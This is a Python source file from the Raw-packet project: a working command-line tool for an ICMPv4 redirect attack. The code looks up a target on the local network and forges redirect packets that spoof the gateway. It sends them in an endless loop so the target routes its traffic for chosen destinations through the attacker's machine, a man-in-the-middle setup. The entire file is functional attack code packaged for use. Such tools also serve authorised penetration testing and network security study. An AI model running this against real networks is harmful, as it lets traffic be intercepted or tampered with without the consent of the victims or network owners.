#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
icmpv4_redirect.py: ICMPv4 redirect (icmpv4_redirect)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.network import RawSend, RawICMPv4
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from typing import Union, List, Dict
from re import sub
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
__script_name__ = 'ICMPv4 redirect (icmpv4_redirect)'
# endregion


# region class ICMPv4Redirect
class ICMPv4Redirect:
    
    # region Variables
    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    _utils: Utils = Utils()
    _icmpv4: RawICMPv4 = RawICMPv4()

    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None}
    _target: Dict[str, Union[None, str]] = {'ipv4-address': None, 'mac-address': None, 'vendor': None}
    # endregion

    # region Init
    def __init__(self, network_interface: str) -> None:
        """
        Init
        :param network_interface: Network interface name
        """
        self._your = self._base.get_interface_settings(interface_name=network_interface,
                                                       required_parameters=['mac-address',
                                                                            'ipv4-address'])
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion
    
    # region Start ICMPv4 Redirect
    def start(self, 
              gateway_ipv4_address: Union[None, str] = None,
              target_ipv4_address: Union[None, str] = None,
              target_mac_address: Union[None, str] = None,
              redirect_ipv4_addresses: List[str] = ['1.1.1.1', '8.8.8.8'],
              quit: bool = False):
        """
        Start ICMPv4 Redirect
        :param gateway_ipv4_address: Gateway IPv4 address (example: '192.168.0.254')
        :param target_ipv4_address: Target IPv4 address (example: '192.168.0.1')
        :param target_mac_address: Target MAC address (example: '12:34:56:78:90:ab')
        :param redirect_ipv4_addresses: List of IPv4 address for redirect (example: ['1.1.1.1', '8.8.8.8'])
        :param quit: Quit mode (default: False)
        :return: None
        """
        try:
            
            # region Check IPv4 gateway
            if gateway_ipv4_address is not None:
                gateway_ipv4_address: str = \
                    self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                                   ipv4_address=gateway_ipv4_address,
                                                   is_local_ipv4_address=True,
                                                   parameter_name='gateway_ipv4_address')
            else:
                assert self._your['ipv4-gateway'] is not None, \
                    'Network interface: ' + self._base.error_text(self._your['network-interface']) + \
                    ' does not have IPv4 gateway!'
                gateway_ipv4_address: str = self._your['ipv4-gateway']
            # endregion

            # region Check Redirected host IP address
            for _redirect_ipv4_address in redirect_ipv4_addresses:
                self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                               ipv4_address=_redirect_ipv4_address,
                                               is_local_ipv4_address=False,
                                               parameter_name='redirected IPv4 address')
            # endregion

            # region General output
            if not quit:
                self._base.print_info('Network interface: ', self._your['network-interface'])
                self._base.print_info('Gateway IPv4 address: ', gateway_ipv4_address)
                self._base.print_info('Redirect IPv4 addresses: ', str(redirect_ipv4_addresses))
                self._base.print_info('Your IPv4 address: ', self._your['ipv4-address'])
                self._base.print_info('Your MAC address: ', self._your['mac-address'])
            # endregion

            # region Check target host IP and MAC address
            self._target = self._utils.set_ipv4_target(network_interface=self._your['network-interface'],
                                                       target_ipv4_address=target_ipv4_address,
                                                       target_mac_address=target_mac_address,
                                                       exclude_ipv4_addresses=[gateway_ipv4_address])
            if not quit:
                self._base.print_success('Target IPv4 address: ', self._target['ipv4-address'])
                self._base.print_success('Target MAC address: ', self._target['mac-address'])
                if self._target['vendor'] is not None:
                    self._base.print_success('Target vendor: ', self._target['vendor'])
            # endregion

            # region Send ICMPv4 redirect packets
            icmpv4_packets: List[bytes] = list()
            for _redirect_ipv4_address in redirect_ipv4_addresses:
                if not quit:
                    self._base.print_info('Send ICMPv4 redirect packets: ', self._target['ipv4-address'], ' <-> ',
                                          self._your['ipv4-address'], ' <-> ', _redirect_ipv4_address)
                icmpv4_packets.append(self._icmpv4.make_redirect_packet(ethernet_src_mac=self._your['mac-address'],
                                                                        ethernet_dst_mac=self._target['mac-address'],
                                                                        ip_src=gateway_ipv4_address,
                                                                        ip_dst=self._target['ipv4-address'],
                                                                        gateway_address=self._your['ipv4-address'],
                                                                        payload_ip_src=self._target['ipv4-address'],
                                                                        payload_ip_dst=_redirect_ipv4_address))
            while True:
                self._raw_send.send_packets(packets=icmpv4_packets, delay=0.5)
            # endregion

        except KeyboardInterrupt:
            if not quit:
                self._base.print_info('Exit')
            exit(0)

        except AssertionError as Error:
            if not quit:
                self._base.print_error(Error.args[0])
            exit(1)

    # endregion

# endregion


# region Main function
def main() -> None:
    """
    Start ICMPv4 redirect (icmpv4_redirect)
    :return: None
    """

    # region Init Raw-packet classes
    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    utils: Utils = Utils()
    # endregion

    # region Parse script arguments
    parser: ArgumentParser = ArgumentParser(description=base.get_banner(__script_name__),
                                            formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--interface', help='Set interface name for send ICMP redirect packets', 
                        default=None, type=str)
    parser.add_argument('-t', '--target_ip', help='Set target IPv4 address', default=None, type=str)
    parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None, type=str)
    parser.add_argument('-g', '--gateway_ip', help='Set gateway IPv4 address (default: <your_ipv4_gateway>)',
                        default=None, type=str)
    parser.add_argument('-r', '--redirect_ip', help='Set IP addresses where to redirect (example: "1.1.1.1,8.8.8.8")',
                        default='1.1.1.1,8.8.8.8', type=str)
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    args = parser.parse_args()
    # endregion

    # region Print banner
    if not args.quiet:
        base.print_banner(__script_name__)
    # endregion

    try:
        # region Get current network interface
        current_network_interface: str = \
            base.network_interface_selection(interface_name=args.interface,
                                             message='Please select a network interface for ' +
                                                     __script_name__ + ' from table: ')
        # endregion
    
        # region Create redirect IPv4 addresses list
        redirect_ipv4_addresses: List[str] = list()
        redirect_ipv4_addresses_str: str = sub(r' +', '', args.redirect_ip)
        for _ipv4_address in redirect_ipv4_addresses_str.split(','):
            redirect_ipv4_addresses.append(utils.check_ipv4_address(network_interface=current_network_interface,
                                                                    ipv4_address=_ipv4_address,
                                                                    is_local_ipv4_address=False,
                                                                    parameter_name='redirected IPv4 address'))
        # endregion

        # region Start ICMPv4 redirect (icmpv4_redirect)
        icmpv4_redirect: ICMPv4Redirect = ICMPv4Redirect(network_interface=current_network_interface)
        icmpv4_redirect.start(gateway_ipv4_address=args.gateway_ip,
                              target_ipv4_address=args.target_ip,
                              target_mac_address=args.target_mac,
                              redirect_ipv4_addresses=redirect_ipv4_addresses,
                              quit=args.quiet)
        # endregion
        
    except KeyboardInterrupt:
        if not args.quiet:
            base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        if not args.quiet:
            base.print_error(Error.args[0])
        exit(1)
    # endregion

# endregion


# region Call Main function
if __name__ == "__main__":
    main()
# endregion
